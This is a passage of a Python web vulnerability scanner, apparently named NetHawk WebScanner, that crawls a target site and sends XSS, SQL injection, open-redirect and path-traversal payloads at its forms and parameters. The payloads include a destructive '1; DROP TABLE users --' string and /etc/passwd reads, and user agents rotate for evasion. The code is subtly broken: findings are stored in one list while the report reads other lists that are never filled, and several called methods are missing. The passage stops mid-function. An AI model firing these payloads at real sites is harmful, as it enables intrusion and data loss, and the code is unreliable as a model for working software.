#!/usr/bin/env python3

import requests
import re
import socket
import time
import json
import urllib.parse
import concurrent.futures
import random
import ssl
import subprocess
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import sys
import os
import hashlib
from src.logos.logo import Logo
import base64
import pickle
import tempfile
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import csv
from datetime import datetime, timedelta
import traceback
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from termcolor import colored
import logging

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebScanner:
    """Web Vulnerability Scanner for identifying common web vulnerabilities"""
    def __init__(self, target_url, max_threads=10, timeout=5, verbose=False):
        # Ensure URL has a scheme
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
            
        self.target_url = target_url
        self.base_url = self._get_base_url()
        self.timeout = timeout
        self.max_threads = max_threads
        self.verbose = verbose
        self.start_time = datetime.now()
        
        # Storage for findings
        self.vulnerabilities = []
        self.forms = []
        self.discovered_urls = []
        self.server_info = {}
        self.subdomains = []
        self.technology_stack = {}
        self.directories = []
        self.api_endpoints = []
        
        # Initialize vulnerability collections
        self.xss_vulnerabilities = []
        self.sqli_vulnerabilities = []
        self.open_redirect_vulnerabilities = []
        self.lfi_vulnerabilities = []
        self.csrf_vulnerabilities = []
        self.command_injection_vulnerabilities = []
        self.rce_vulnerabilities = []
        self.cors_vulnerabilities = []
        self.ssl_tls_vulnerabilities = []
        self.missing_headers = []
        
        # Create logger
        self.logger = logging.getLogger("WebScanner")
        self.logger.setLevel(logging.INFO)
        
        # Add console handler if not already added
        if not self.logger.handlers:
            console_handler = logging.StreamHandler()
            console_handler.setLevel(logging.INFO)
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            console_handler.setFormatter(formatter)
            self.logger.addHandler(console_handler)
        
        # User agent rotation for evasion
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67'
        ]
        
        # Headers with random user agent
        self.headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        # Session to maintain cookies
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        # Common directories for brute forcing
        self.common_dirs = [
            'admin', 'administrator', 'login', 'wp-admin', 'cp', 'cpanel', 'dashboard',
            'api', 'v1', 'v2', 'v3', 'api/v1', 'api/v2', 'console', 'control', 'panel',
            'webadmin', 'user', 'users', 'upload', 'uploads', 'backup', 'backups', 'config',
            'conf', 'settings', 'setting', 'setup', 'install', 'wp-content', 'wp-includes',
            'content', 'assets', 'static', 'tmp', 'temp', 'private', 'public', 'src',
            'database', 'db', 'sql', 'data', 'logs', 'log', 'secret', 'secrets', 'secure',
            'dev', 'development', 'test', 'testing', 'staging', 'production', 'old', 'new',
            'beta', 'alpha', 'debug', '.git', '.svn', '.env', 'wp-json', 'json', 'rest'
        ]
        
        # Common file extensions for brute forcing
        self.common_extensions = [
            '.php', '.html', '.js', '.txt', '.bak', '.old', '.sql', '.xml', '.json', 
            '.config', '.cfg', '.conf', '.log', '.db', '.sqlite', '.zip', '.tar.gz', 
            '.rar', '.7z', '.env', '.ini', '.yml', '.yaml', '.csv', '.bak.php', 
            '.backup.php', '.old.php', '.inc', '.inc.php', '.swp', '.gitignore'
        ]
        
    def _get_base_url(self):
        """Extract the base URL (scheme + domain) from the target URL"""
        parsed = urllib.parse.urlparse(self.target_url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    def run(self, report_format='html'):
        """
        Execute all scanning methods and generate a final report.
        
        Args:
            report_format (str): Format for the final report (json, html, csv)
            
        Returns:
            str: Path to the generated report file
        """
        # Import Logo class for displaying the banner
        from src.logos.logo import Logo
        logo = Logo()
        logo.web_scanner_logo()
        
        print(colored("\n[*] ", 'blue') + f"Starting web scan against {self.target_url}")
        print(colored("[*] ", 'blue') + "This may take some time depending on the target size...")
        
        # Step 1: Gather server information
        print(colored("\n[+] ", 'green') + "Gathering server information...")
        self.server_info = self.gather_server_info()
        
        # Step 2: Discover URLs
        print(colored("\n[+] ", 'green') + "Discovering URLs...")
        self.discover_urls()
        print(colored("[+] ", 'green') + f"Found {len(self.discovered_urls)} URLs")
        
        # Step 3: Find forms
        print(colored("\n[+] ", 'green') + "Finding forms...")
        self.find_forms()
        print(colored("[+] ", 'green') + f"Found {len(self.forms)} forms")
        
        # Step 4: Check security headers
        print(colored("\n[+] ", 'green') + "Checking security headers...")
        self.check_security_headers()
        
        # Step 5: Detect technologies
        print(colored("\n[+] ", 'green') + "Detecting technology stack...")
        self.detect_tech_stack()
        
        # Step 6: Enumerate subdomains
        print(colored("\n[+] ", 'green') + "Enumerating subdomains...")
        self.enumerate_subdomains()
        
        # Step 7: Brute force directories
        print(colored("\n[+] ", 'green') + "Brute forcing directories...")
        self.brute_force_directories()
        
        # Step 8: Test for vulnerabilities
        print(colored("\n[+] ", 'green') + "Testing for XSS vulnerabilities...")
        self.test_xss_vulnerabilities()
        
        print(colored("\n[+] ", 'green') + "Testing for SQL injection vulnerabilities...")
        self.test_sql_injection()
        
        print(colored("\n[+] ", 'green') + "Testing for open redirect vulnerabilities...")
        self.test_open_redirect()
        
        print(colored("\n[+] ", 'green') + "Testing for LFI vulnerabilities...")
        self.test_lfi()
        
        print(colored("\n[+] ", 'green') + "Testing for CSRF vulnerabilities...")
        self.test_csrf()
        
        print(colored("\n[+] ", 'green') + "Testing for CORS misconfigurations...")
        self.test_cors_misconfig()
        
        print(colored("\n[+] ", 'green') + "Testing for command injection vulnerabilities...")
        self.test_command_injection()
        
        print(colored("\n[+] ", 'green') + "Testing for RCE vulnerabilities...")
        self.test_rce()
        
        # Generate report
        print(colored("\n[+] ", 'green') + "Generating scan report...")
        report_path = self.generate_report(report_format)
        
        print(colored("\n[+] ", 'cyan', attrs=['bold']) + f"Scan completed in {datetime.now() - self.start_time}")
        print(colored("[+] ", 'cyan', attrs=['bold']) + f"Report saved to: {report_path}")
        
        return report_path

    def gather_server_info(self):
        """
        Gather basic information about the target server.
        
        Returns:
            dict: Server information
        """
        server_info = {
            "server": "Unknown",
            "technologies": [],
            "ip_address": "Unknown",
            "headers": {}
        }
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            
            parsed_url = urllib.parse.urlparse(self.target_url)
            hostname = parsed_url.netloc
            
            try:
                ip_address = socket.gethostbyname(hostname)
                server_info["ip_address"] = ip_address
            except socket.gaierror:
                server_info["ip_address"] = "Unknown"
            
            # Extract server header and other headers
            if response.headers:
                server_info["headers"] = dict(response.headers)
                
                if "Server" in response.headers:
                    server_info["server"] = response.headers["Server"]
                
                # Check for various technology indicators
                tech_indicators = {
                    "PHP": ["X-Powered-By: PHP", "PHPSESSID"],
                    "ASP.NET": ["X-AspNet-Version", "ASP.NET", ".NET"],
                    "Django": ["csrftoken", "django"],
                    "Ruby on Rails": ["_rails_session"],
                    "jQuery": ["jquery"],
                    "React": ["react"],
                    "Angular": ["angular"],
                    "Bootstrap": ["bootstrap"],
                    "WordPress": ["wp-content", "wp-includes"],
                    "Apache": ["apache"],
                    "Nginx": ["nginx"],
                    "IIS": ["IIS"],
                    "CloudFlare": ["cloudflare"],
                    "AWS": ["aws", "amazon"],
                    "Akamai": ["akamai"]
                }
                
                # Check headers and response content for technology indicators
                response_text = response.text.lower()
                for tech, indicators in tech_indicators.items():
                    for indicator in indicators:
                        if indicator.lower() in str(response.headers).lower() or indicator.lower() in response_text:
                            if tech not in server_info["technologies"]:
                                server_info["technologies"].append(tech)
                
            # Print server information
            if self.verbose:
                self.logger.info(f"Server: {server_info['server']}")
                self.logger.info(f"IP Address: {server_info['ip_address']}")
                self.logger.info(f"Technologies: {', '.join(server_info['technologies'])}")
                
                self.logger.info("HTTP Headers:")
                for header, value in server_info["headers"].items():
                    self.logger.info(f"  {header}: {value}")
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error gathering server information: {str(e)}")
        
        return server_info

    def discover_urls(self):
        """
        Crawl the website to discover URLs.
        
        Populates the discovered_urls list with all discovered URLs.
        """
        self.discovered_urls = []
        to_visit = [self.target_url]
        visited = set()
        max_urls = 500  # Limit to avoid crawling the entire internet
        
        def extract_urls(url):
            """Extract URLs from a webpage"""
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    return []
                
                soup = BeautifulSoup(response.text, 'html.parser')
                new_urls = []
                
                # Extract links from <a> tags
                for a_tag in soup.find_all('a', href=True):
                    href = a_tag['href']
                    full_url = urljoin(url, href)
                    
                    # Filter URLs to stay within the same domain
                    parsed_url = urllib.parse.urlparse(full_url)
                    base_parsed = urllib.parse.urlparse(self.base_url)
                    
                    if parsed_url.netloc == base_parsed.netloc:
                        # Remove fragments
                        full_url = full_url.split('#')[0]
                        new_urls.append(full_url)
                
                # Extract URLs from <script>, <link>, <img> tags
                for tag in soup.find_all(['script', 'link', 'img']):
                    if tag.has_attr('src'):
                        src = tag['src']
                        full_url = urljoin(url, src)
                        parsed_url = urllib.parse.urlparse(full_url)
                        base_parsed = urllib.parse.urlparse(self.base_url)
                        
                        if parsed_url.netloc == base_parsed.netloc:
                            new_urls.append(full_url)
                    elif tag.name == 'link' and tag.has_attr('href'):
                        href = tag['href']
                        full_url = urljoin(url, href)
                        parsed_url = urllib.parse.urlparse(full_url)
                        base_parsed = urllib.parse.urlparse(self.base_url)
                        
                        if parsed_url.netloc == base_parsed.netloc:
                            new_urls.append(full_url)
                
                return list(set(new_urls))
                
            except Exception as e:
                if self.verbose:
                    self.logger.error(f"Error fetching {url}: {str(e)}")
                return []
        
        # Breadth-first search to discover URLs
        while to_visit and len(visited) < max_urls:
            # Process URLs in batches for efficiency
            batch_size = min(self.max_threads, len(to_visit))
            current_batch = to_visit[:batch_size]
            to_visit = to_visit[batch_size:]
            
            # Extract new URLs from current batch
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                new_urls = list(executor.map(extract_urls, current_batch))
            
            # Add current batch to visited and discovered_urls
            for url in current_batch:
                visited.add(url)
                self.discovered_urls.append(url)
                
            # Add new URLs to to_visit queue if not already processed
            for url_list in new_urls:
                for url in url_list:
                    if url not in visited and url not in to_visit:
                        to_visit.append(url)
        
        # Remove duplicates while maintaining order
        self.discovered_urls = list(dict.fromkeys(self.discovered_urls))
        
        if self.verbose:
            self.logger.info(f"Discovered {len(self.discovered_urls)} URLs")

    def find_forms(self):
        """Find forms in the discovered URLs"""
        def process_url(url):
            try:
                response = self.session.get(url, timeout=self.timeout)
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    return []
                
                soup = BeautifulSoup(response.text, 'html.parser')
                forms_found = []
                
                for form in soup.find_all('form'):
                    form_info = {
                        'url': url,
                        'action': form.get('action', ''),
                        'method': form.get('method', 'get').upper(),
                        'inputs': []
                    }
                    
                    # Get full action URL
                    if form_info['action'].startswith('/'):
                        form_info['action'] = self.base_url + form_info['action']
                    elif not form_info['action'].startswith('http'):
                        form_info['action'] = urllib.parse.urljoin(url, form_info['action'])
                    
                    # Extract input fields
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        input_type = input_field.get('type', '')
                        input_name = input_field.get('name', '')
                        
                        if input_name and input_type not in ['submit', 'button', 'image', 'reset']:
                            form_info['inputs'].append({
                                'name': input_name,
                                'type': input_type
                            })
                    
                    forms_found.append(form_info)
                
                return forms_found
            except:
                return []
                
        all_forms = []
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for forms in executor.map(process_url, self.discovered_urls):
                all_forms.extend(forms)
        
        self.forms = all_forms

    def test_xss_vulnerabilities(self):
        """Test for XSS vulnerabilities in forms"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            '"onmouseover="alert(\'XSS\')"',
            'javascript:alert("XSS")'
        ]
        
        def test_form(form):
            vulnerabilities = []
            
            for input_field in form['inputs']:
                for payload in xss_payloads:
                    data = {}
                    for field in form['inputs']:
                        if field['type'] == 'email':
                            data[field['name']] = 'test@example.com'
                        elif field['type'] == 'password':
                            data[field['name']] = 'Password123!'
                        else:
                            data[field['name']] = 'test'
                    
                    # Set our XSS payload in the current field
                    data[input_field['name']] = payload
                    
                    try:
                        if form['method'] == 'GET':
                            response = self.session.get(form['action'], params=data, timeout=self.timeout)
                        else:
                            response = self.session.post(form['action'], data=data, timeout=self.timeout)
                        
                        # Check if the payload is reflected in the response
                        if payload in response.text and not re.search(r'&lt;script&gt;', response.text):
                            vuln = {
                                'type': 'XSS',
                                'url': form['url'],
                                'form_action': form['action'],
                                'method': form['method'],
                                'field': input_field['name'],
                                'payload': payload,
                                'confidence': 'Medium'  # Basic check, might be false positive
                            }
                            vulnerabilities.append(vuln)
                            print(Fore.RED + f"[!] Potential XSS found at {form['action']} in field {input_field['name']}" + Style.RESET_ALL)
                            break  # Found one for this field, move to next field
                    except:
                        continue
            
            return vulnerabilities
        
        results = []
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for vulns in executor.map(test_form, self.forms):
                results.extend(vulns)
        
        self.vulnerabilities.extend(results)

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        sqli_payloads = [
            "' OR '1'='1", 
            "' OR '1'='1' --", 
            "\" OR \"1\"=\"1", 
            "\" OR \"1\"=\"1\" --",
            "1' OR '1'='1", 
            "admin' --",
            "1; DROP TABLE users --"
        ]
        
        sqli_errors = [
            "SQL syntax",
            "mysql_fetch",
            "sqlite3",
            "PostgreSQL",
            "ORA-",
            "Microsoft SQL Server",
            "MySQL server",
            "SQLSTATE",
            "ODBC Driver",
            "syntax error",
            "unclosed quotation mark"
        ]
        
        def test_form(form):
            vulnerabilities = []
            
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'search', 'hidden', '']:
                    for payload in sqli_payloads:
                        data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                data[field['name']] = payload
                            elif field['type'] == 'email':
                                data[field['name']] = 'test@example.com'
                            elif field['type'] == 'password':
                                data[field['name']] = 'Password123!'
                            else:
                                data[field['name']] = 'test'
                        
                        try:
                            if form['method'] == 'GET':
                                response = self.session.get(form['action'], params=data, timeout=self.timeout)
                            else:
                                response = self.session.post(form['action'], data=data, timeout=self.timeout)
                            
                            # Check for SQL error messages
                            for error in sqli_errors:
                                if error.lower() in response.text.lower():
                                    vuln = {
                                        'type': 'SQL Injection',
                                        'url': form['url'],
                                        'form_action': form['action'],
                                        'method': form['method'],
                                        'field': input_field['name'],
                                        'payload': payload,
                                        'error': error,
                                        'confidence': 'High'
                                    }
                                    vulnerabilities.append(vuln)
                                    print(Fore.RED + f"[!] Potential SQL Injection found at {form['action']} in field {input_field['name']}" + Style.RESET_ALL)
                                    return vulnerabilities  # Found one, no need to test more
                        except:
                            continue
            
            # Also test URL parameters
            parsed_url = urllib.parse.urlparse(form['url'])
            params = urllib.parse.parse_qs(parsed_url.query)
            
            if params:
                for param_name, param_value in params.items():
                    for payload in sqli_payloads:
                        new_params = params.copy()
                        new_params[param_name] = [payload]
                        
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            query,
                            parsed_url.fragment
                        ))
                        
                        try:
                            response = self.session.get(test_url, timeout=self.timeout)
                            
                            for error in sqli_errors:
                                if error.lower() in response.text.lower():
                                    vuln = {
                                        'type': 'SQL Injection',
                                        'url': form['url'],
                                        'parameter': param_name,
                                        'payload': payload,
                                        'error': error,
                                        'confidence': 'High'
                                    }
                                    vulnerabilities.append(vuln)
                                    print(Fore.RED + f"[!] Potential SQL Injection found in URL parameter {param_name}" + Style.RESET_ALL)
                                    return vulnerabilities  # Found one, no need to test more
                        except:
                            continue
            
            return vulnerabilities
        
        results = []
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for vulns in executor.map(test_form, self.forms):
                results.extend(vulns)
        
        self.vulnerabilities.extend(results)
    
    def test_open_redirect(self):
        """Test for open redirect vulnerabilities"""
        redirect_parameters = ['redirect', 'url', 'return', 'next', 'redir', 'r', 'redirect_uri', 'redirect_url', 'goto']
        redirect_payloads = ['https://example.com', '//example.com', 'javascript:alert("Open Redirect")']
        
        def test_url(url):
            vulnerabilities = []
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            for param in redirect_parameters:
                if param in params:
                    for payload in redirect_payloads:
                        new_params = params.copy()
                        new_params[param] = [payload]
                        
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            query,
                            parsed_url.fragment
                        ))
                        
                        try:
                            response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                            
                            # Check for redirect
                            if 300 <= response.status_code < 400:
                                location = response.headers.get('Location', '')
                                if payload in location:
                                    vuln = {
                                        'type': 'Open Redirect',
                                        'url': url,
                                        'parameter': param,
                                        'payload': payload,
                                        'redirects_to': location,
                                        'confidence': 'High'
                                    }
                                    vulnerabilities.append(vuln)
                                    print(Fore.RED + f"[!] Open Redirect found at {url} with parameter {param}" + Style.RESET_ALL)
                                    return vulnerabilities  # Found one, no need to test more
                        except:
                            continue
            
            return vulnerabilities
        
        results = []
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for vulns in executor.map(test_url, self.discovered_urls):
                results.extend(vulns)
        
        self.vulnerabilities.extend(results)
    
    def test_lfi(self):
        """Test for Local File Inclusion vulnerabilities"""
        lfi_payloads = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../etc/passwd',
            '../../etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
        ]
        
        lfi_patterns = [
            'root:x:0:0',
            'nobody:x:',
            'bin:x:',
            'daemon:x:'
        ]
        
        def test_url(url):
            vulnerabilities = []
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            if not params:
                return []
                
            for param_name in params:
                for payload in lfi_payloads:
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    
                    query = urllib.parse.urlencode(new_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        content = response.text.lower()
                        
                        for pattern in lfi_patterns:
                            if pattern.lower() in content:
                                vuln = {
                                    'type': 'Local File Inclusion',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'evidence': pattern,
                                    'confidence': 'High'
                                }
                                vulnerabilities.append(vuln)
                                print(Fore.RED + f"[!] Local File Inclusion found at {url} with parameter {param_name}" + Style.RESET_ALL)
                                return vulnerabilities  # Found one, no need to test more
                    except:
                        continue
            
            return vulnerabilities
        
        results = []
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for vulns in executor.map(test_url, self.discovered_urls):
                results.extend(vulns)
        
        self.vulnerabilities.extend(results)
    
    def check_security_headers(self):
        """Check for missing security headers"""
        security_headers = {
            'X-XSS-Protection': 'Missing X-XSS-Protection header',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
            'X-Frame-Options': 'Missing X-Frame-Options header',
            'Content-Security-Policy': 'Missing Content-Security-Policy header',
            'Strict-Transport-Security': 'Missing HSTS header',
            'Referrer-Policy': 'Missing Referrer-Policy header'
        }
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            headers = response.headers
            
            for header, message in security_headers.items():
                if header not in headers:
                    vuln = {
                        'type': 'Missing Security Header',
                        'url': self.target_url,
                        'header': header,
                        'message': message,
                        'confidence': 'Medium'
                    }
                    self.vulnerabilities.append(vuln)
                    print(Fore.YELLOW + f"[!] {message}" + Style.RESET_ALL)
        except:
            pass
    
    def generate_report(self, report_format="json", output_dir="reports"):
        """
        Generate a report of scan findings.
        
        Args:
            report_format (str): The format of the report. Options: json, html, csv
            output_dir (str): Directory to save the report
            
        Returns:
            str: Path to the generated report
        """
        # Import necessary modules
        import csv
        import json
        import os
        from datetime import datetime
        
        # Create reports directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        # Prepare report data
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        target_domain = self.target_url.replace("http://", "").replace("https://", "").split("/")[0]
        report_name = f"{target_domain}_{timestamp}"
        
        # Get vulnerability descriptions
        vuln_descriptions = self._get_vulnerability_descriptions()
        
        # Initialize summary statistics
        total_urls = len(self.discovered_urls)
        total_vulns = 0
        vuln_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        vuln_types = {}
        
        # Process vulnerabilities with their descriptions and details
        processed_vulns = []
        
        # Process XSS vulnerabilities
        for vuln in self.xss_vulnerabilities:
            vuln_type = "XSS"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "parameters": vuln["parameter"],
                "payload": vuln["payload"],
                "evidence": vuln.get("evidence", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process SQL Injection vulnerabilities
        for vuln in self.sqli_vulnerabilities:
            vuln_type = "SQL Injection"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "parameters": vuln["parameter"],
                "payload": vuln["payload"],
                "evidence": vuln.get("evidence", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process Open Redirect vulnerabilities
        for vuln in self.open_redirect_vulnerabilities:
            vuln_type = "Open Redirect"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "parameters": vuln["parameter"],
                "payload": vuln["payload"],
                "evidence": vuln.get("evidence", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process CSRF vulnerabilities
        for vuln in self.csrf_vulnerabilities:
            vuln_type = "CSRF"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "parameters": vuln.get("parameter", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process Command Injection vulnerabilities
        for vuln in self.command_injection_vulnerabilities:
            vuln_type = "Command Injection"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "parameters": vuln["parameter"],
                "payload": vuln["payload"],
                "evidence": vuln.get("evidence", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process LFI vulnerabilities
        for vuln in self.lfi_vulnerabilities:
            vuln_type = "LFI"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "parameters": vuln["parameter"],
                "payload": vuln["payload"],
                "evidence": vuln.get("evidence", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process RCE vulnerabilities if present
        for vuln in getattr(self, 'rce_vulnerabilities', []):
            vuln_type = "RCE"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "parameters": vuln.get("parameter", ""),
                "payload": vuln.get("payload", ""),
                "evidence": vuln.get("evidence", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process CORS vulnerabilities if present
        for vuln in getattr(self, 'cors_vulnerabilities', []):
            vuln_type = "CORS"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": vuln["url"],
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process SSL/TLS vulnerabilities if present
        for vuln in getattr(self, 'ssl_tls_vulnerabilities', []):
            vuln_type = "SSL/TLS"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": self.target_url,
                "evidence": vuln.get("issue", ""),
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Process missing security headers if present
        for vuln in getattr(self, 'missing_headers', []):
            vuln_type = "Missing HTTP Security Headers"
            severity = vuln_descriptions[vuln_type]["severity"]
            risk_score = vuln_descriptions[vuln_type]["risk_score"]
            
            processed_vuln = {
                "type": vuln_type,
                "severity": severity,
                "risk_score": risk_score,
                "url": self.target_url,
                "evidence": f"Missing header: {vuln}",
                "details": vuln_descriptions[vuln_type]
            }
            
            processed_vulns.append(processed_vuln)
            total_vulns += 1
            vuln_counts[severity] += 1
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        # Sort vulnerabilities by risk score (highest first)
        processed_vulns.sort(key=lambda x: x["risk_score"], reverse=True)
            
        # Create report data structure
        report_data = {
            "scan_info": {
                "target": self.target_url,
                "start_time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
                "end_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "duration": str(datetime.now() - self.start_time),
                "scanner_version": "NetHawk WebScanner 1.0"
            },
            "server_info": self.server_info,
            "summary": {
                "total_urls_discovered": total_urls,
                "total_vulnerabilities": total_vulns,
                "vulnerability_counts": vuln_counts,
                "vulnerability_types": vuln_types
            },
            "vulnerabilities": processed_vulns
        }
        
        # Generate report in specified format
        if report_format.lower() == "json":
            report_path = os.path.join(output_dir, f"{report_name}.json")
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=4)
        elif report_format.lower() == "html":
            report_path = os.path.join(output_dir, f"{report_name}.html")
            self._generate_html_report(report_path, report_data, vuln_descriptions)
        elif report_format.lower() == "csv":
            report_path = os.path.join(output_dir, f"{report_name}.csv")
            self._generate_csv_report(report_path, report_data)
        else:
            self.logger.error(f"Unsupported report format: {report_format}")
            report_path = os.path.join(output_dir, f"{report_name}.json")
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=4)
            self.logger.info(f"Defaulting to JSON format")
            
        self.logger.info(f"Report saved to {report_path}")
        return report_path

    def _get_vulnerability_descriptions(self):
        """
        Returns detailed descriptions for each vulnerability type.
        
        Returns:
            dict: Dictionary containing detailed information about each vulnerability type
        """
        return {
